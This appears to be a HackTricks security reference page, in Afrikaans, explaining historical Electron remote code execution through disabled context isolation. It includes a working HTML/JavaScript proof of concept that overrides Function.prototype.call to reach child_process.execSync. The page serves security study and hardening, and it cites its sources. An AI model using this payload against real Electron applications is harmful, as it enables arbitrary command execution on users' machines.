# Electron context-isolation RCE via interne kode

{{#include ../../banners/hacktricks-training.md}}

Dit is **historiese uitbuitingspatrone** vir Electron-toepassings wat onbetroubare renderer-inhoud sonder context isolation uitgevoer het. Context isolation is sedert Electron 12 by verstek geaktiveer en bly ’n aanbevole sekuriteitsinstelling.<sup>[[1]](#references)</sup> Presiese interne besonderhede verskil volgens Electron- en Node.js-weergawes, so reproduseer ’n ketting teen die teikentoepassing se gebundelde weergawes.

## Voorbeeld 1: `Function.prototype.call` oorheers

Hierdie voorbeeld kom uit Masato Kinugawa se CureCon-aanbieding.<sup>[[2]](#references)</sup>

In die betrokke historiese Electron-weergawe het interne ASAR-kode ’n `exit`-luisteraar vir die proses geregistreer. Omdat bladsykode en Electron se interne kode JavaScript-prototipes gedeel het toe context isolation gedeaktiveer was, kon renderer-kode `Function.prototype.call` vervang voordat die interne luisteraar uitgevoer is.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Electron asar.js se interne kodepad wat in die contextIsolation RCE-voorbeeld gebruik word](<../../images/image (1070).png>)

Die listener is deur Node.js se gebeurtenismeganisme gestuur. Die oorspronklike bladsy het na 'n verouderde `bin/events.js`-pad verwys; die lewendige bronkode van dieselfde historiese commit is onder `lib/events.js`.<sup>[[5]](#references)</sup>

![Node events.js-kodepad wat deur die Electron contextIsolation RCE-ketting bereik word](<../../images/image (793).png>)

In hierdie pad is `self` Node.js se process-object:

![Electron contextIsolation RCE via Electron se interne kode - Voorbeeld 1: Waar "self" Node se process-object is](<../../images/image (700).png>)

Die historiese process-object het 'n pad na `require` blootgestel:

```
process.mainModule.require
```

Omdat die listener dispatcher die handler met die process-objek aangeroep het, kon die oorheersing van `call` daardie objek herwin en ’n native command uitvoer:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Voorbeeld 2: prototype pollution

Die ElectroVolt-aanbieding demonstreer nog ’n historiese ketting wat ’n `require`-objek deur prototype pollution verkry.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron-dokumentasie - K context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Abusing the lack of context isolation - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Electron-historiese bron - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Pwning Popular Desktop Apps While Uncovering New Attack Surface on Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Node.js-historiese bron - `lib/events.js` listener dispatch](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
